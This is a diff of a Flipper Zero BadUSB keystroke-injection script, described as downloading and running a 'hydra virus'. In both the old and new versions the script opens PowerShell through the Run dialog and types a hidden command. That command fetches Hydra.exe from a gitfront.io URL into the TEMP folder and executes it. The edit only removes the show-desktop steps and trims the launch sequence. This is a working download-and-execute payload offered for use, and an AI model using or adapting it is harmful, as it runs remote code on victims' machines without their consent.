@@ -2,15 +2,10 @@ REM Author: planetmeep
 REM Description: downloads and runs hydra virus from windows 93
 REM Version: 1.0
 REM Target: windows
-DELAY 500
-GUI d
-DELAY 500
 GUI r
 DELAY 500
-STRING powershell.exe
-ENTER
-DELAY 2000
-STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://gitfront.io/r/user-6193928/a5WpgTCLW59D/FlipperZero/raw/badusb/hydra/Hydra.exe' -OutFile 'Hydra.exe'; Start-Process -FilePath '.\Hydra.exe'; exit" -WindowStyle Hidden; exit
+STRING powershell
 ENTER
 DELAY 500
-GUI d
+STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://gitfront.io/r/user-6193928/a5WpgTCLW59D/FlipperZero/raw/badusb/hydra/Hydra.exe' -OutFile 'Hydra.exe'; Start-Process -FilePath '.\Hydra.exe'; exit" -WindowStyle Hidden; exit
+ENTER
